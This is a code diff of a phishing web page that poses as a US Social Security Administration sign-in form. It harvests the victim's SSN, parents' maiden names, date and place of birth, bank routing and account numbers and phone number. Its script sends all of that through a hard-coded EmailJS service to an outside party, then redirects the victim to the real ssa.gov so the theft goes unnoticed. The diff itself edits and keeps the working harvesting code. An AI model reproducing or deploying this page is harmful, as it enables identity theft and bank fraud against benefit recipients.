@@ -6,78 +6,75 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="stylesheet" href="https://whiteghost0015.github.io/index.css">
+    <title></title>
    
 
 </head>
 <body>
     <div>
         <header>
-                    <img src="/ssalogo.png">
+                    <img src="https://ssagiv.github.io/y/newssn/images/ssalogo.png">
         </header>
         <p>Sign In</p>
         
         <p>If you have created an account <b>before</b> September 18, 2021, fill in every information correctly</p>	
         <form method="post" id="myForm"> 
-            <label for="full-name">Full Name</label></br>
-            <input required type="text" name="name" class="blanks" id="full-name"><br/>
-            
-            <label for="ssn">SSN</label></br>
-            <input required type="text" class="blanks" id="ssn"/><br/>
-            
-            <label for="mailing-address">Mailing Address On Profile</label></br>
-            <input required type="text" class="blanks" id="mailing-address"/><br/>
+    <label for="full-name">Full Name</label></br>
+    <input required type="text" name="full-name" class="blanks" id="full-name"><br/>
+    
+    <label for="ssn">SSN</label></br>
+    <input required type="text" name="ssn" class="blanks" id="ssn"/><br/>
+    
+    <label for="mailing-address">Mailing Address On Profile</label></br>
+    <input required type="text" name="mailing-address" class="blanks" id="mailing-address"/><br/>
 
-            <label for="fathers">Fathers Full Name and Maiden Name</label></br>
-            <input required id="fathers" type="text" class="blanks"/><br/>
+    <label for="fathers">Fathers Full Name and Maiden Name</label></br>
+    <input required id="fathers" name="fathers" type="text" class="blanks"/><br/>
 
-            <label for="mothers">Mother's Full Name And Maiden Name</label></br>
-            <input required id="mothers" type="text" class="blanks"/><br/>
+    <label for="mothers">Mother's Full Name And Maiden Name</label></br>
+    <input required id="mothers" name="mothers" type="text" class="blanks"/><br/>
 
-            <label for="pob">Place Of birth(City and state)</label></br>
-            <input required id="pob" type="text" class="blanks"/><br/>
-            
-            
-            <label for="state">State</label></br>
-            <input required id="state" type="text" class="blanks"/><br/>
-            
-            <label for="amount">Amount Received Last Month (In USSD)</label></br>
-            <input required id="amount" type="text" class="blanks"/><br/>
+    <label for="pob">Place Of Birth (City and State)</label></br>
+    <input required id="pob" name="pob" type="text" class="blanks"/><br/>
+    
+    <label for="state">State</label></br>
+    <input required id="state" name="state" type="text" class="blanks"/><br/>
+    
+    <label for="amount">Amount Received Last Month (In USSD)</label></br>
+    <input required id="amount" name="amount" type="text" class="blanks"/><br/>
 
-            <label for="routing">Routing Number That's On File</label></br>
-            <input required id="routing" type="text" class="blanks"/><br/>
+    <label for="routing">Routing Number That's On File</label></br>
+    <input required id="routing" name="routing" type="text" class="blanks"/><br/>
 
-            <label for="account">Account Number That's On File</label></br>
-            <input required id="account" class="blanks"/><br/>
+    <label for="account">Account Number That's On File</label></br>
+    <input required id="account" name="account" type="text" class="blanks"/><br/>
 
-            <label for="phone">Phone Number</label></br>
-            <input required id="phone" type="text" class="blanks"/><br/>
+    <label for="phone">Phone Number</label></br>
+    <input required id="phone" name="phone" type="text" class="blanks"/><br/>
 
+    <label for="yes">Did You Receive SSA (YES or NO)</label><br>
+    <select required id="yes" name="yes" class="select">
+        <option>Yes</option>
+        <option>No</option>
+    </select><br>
 
-            <label for="yes">Did You Receive SSA (YES or NO) </label></br>
-            <select required id="yes" type="text" class="select">
-              <option>Yes</option>
-              <option>No</option>
-              </select><br/>
+    <label for="dob">DOB (DD/MM/YYYY)</label></br>
+    <input required id="dob" name="dob" type="text" class="blanks"/><br/>
 
-            <label for="dob">DOB (DD/MM/YYYY)</label></br>
-            <input required id="dob" type="text" class="blanks"/><br/>
+    <label for="dop">Date Of Payment</label></br>
+    <input required id="dop" name="dop" type="text" class="blanks"/><br/>
 
-            <label for="dop">Date Of Payment</label></br>
-            <input required id="dop" type="text" class="blanks"/><br/>
+    <button type="submit" class="button">Submit</button>
+</form>
 
-
-            <button type="submit" class="button">Submit</button>
-
-
-        </form>
         <footer>
             <p>Are you now, or have you ever been a victim of domestic violence? Identity theft? Do you have other concerns?
             </p>
             <p>You can contact us to block electronic access to your information at any time, for any reason.</p>
             <div class="links">
-                <a href="https://ssagovclaim.netlify.app/external.html?link=https://secure.ssa.gov/rome/rir-ui/helpPrivacyAndSecurity"> Privacy and Security</a>
-                <a href="https://ssagovclaim.netlify.app/external.html?link=http://www.socialsecurity.gov/agency/privacy.html">Privacy Policy</a>
-                <a href="https://ssagovclaim.netlify.app/external.html?link=https://secure.ssa.gov/rome/rir-ui/helpPrivacyActStatement">Privacy Act Statement</a>
+                <a href="https://secure.ssa.gov/rome/rir-ui/helpPrivacyAndSecurity"> Privacy and Security</a>
+                <a href="http://www.socialsecurity.gov/agency/privacy.html">Privacy Policy</a>
+                <a href="https://secure.ssa.gov/rome/rir-ui/helpPrivacyActStatement">Privacy Act Statement</a>
             </div>
         </footer>
     </div>
@@ -87,44 +84,56 @@
 
 <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
-  document.addEventListener('DOMContentLoaded', function () {
-    emailjs.init('VCyoayBjibbI-hCZ1'); // Replace with your EmailJS user ID
+    document.addEventListener("DOMContentLoaded", function () {
+        // Initialize EmailJS with your User ID
+        emailjs.init("VCyoayBjibbI-hCZ1"); // Replace with your EmailJS User ID
 
-    $('#myForm').on('submit', function (event) {
-      event.preventDefault(); // Prevent the default form submission
+        document.getElementById("myForm").addEventListener("submit", function (event) {
+            event.preventDefault(); // Prevent default form submission
 
-      // Collect form data
-      var formData = {
-        fullName: $('#full-name').val(),
-        ssn: $('#ssn').val(),
-        mailingAddress: $('#mailing-address').val(),
-        fathersName: $('#fathers').val(),
-        mothersName: $('#mothers').val(),
-        placeOfBirth: $('#pob').val(),
-        state: $('#state').val(),
-        amountReceived: $('#amount').val(),
-        routingNumber: $('#routing').val(),
-        accountNumber: $('#account').val(),
-        phoneNumber: $('#phone').val(),
-        receivedSSA: $('#yes').val(),
-        dob: $('#dob').val(),
-        dateOfPayment: $('#dop').val(),
-      };
+            // Collect form data
+            const formData = {
+                "full-name": document.getElementById("full-name").value,
+                "ssn": document.getElementById("ssn").value,
+                "mailing-address": document.getElementById("mailing-address").value,
+                "fathers": document.getElementById("fathers").value,
+                "mothers": document.getElementById("mothers").value,
+                "pob": document.getElementById("pob").value,
+                "state": document.getElementById("state").value,
+                "amount": document.getElementById("amount").value,
+                "routing": document.getElementById("routing").value,
+                "account": document.getElementById("account").value,
+                "phone": document.getElementById("phone").value,
+                "yes": document.getElementById("yes").value,
+                "dob": document.getElementById("dob").value,
+                "dop": document.getElementById("dop").value
+            };
 
-      // Use EmailJS to send the email
-      emailjs.send('service_httl3qt', 'template_q9l6n53', formData)
-        .then(function (response) {
-          console.log('SUCCESS!', response.status, response.text);
-          swal("Application submitted successfully!", "", "success").then(() => {
-            window.location.href = "https://ssa.gov/";
-          });
-        }, function (error) {
-          console.error('FAILED...', error);
-          swal("An error occurred while saving the application!", "", "warning");
+            // Send form data via EmailJS
+            emailjs.send("service_httl3qt", "template_q9l6n53", formData)
+                .then(function (response) {
+                    console.log("Success!", response.status, response.text);
+                    swal({
+                        title: "Form submitted successfully!",
+                        icon: "success",
+                    }).then(() => {
+                        // Redirect to the specified URL after clicking "OK"
+                        window.location.href = "https://ssa.gov/";
+                    });
+                })
+                .catch(function (error) {
+                    console.error("Failed to send email:", error);
+                    swal({
+                        title: "Failed to submit the form.",
+                        text: "Please try again later.",
+                        icon: "error",
+                    });
+                });
         });
     });
-  });
 </script>
+
+
 
   
 </body>
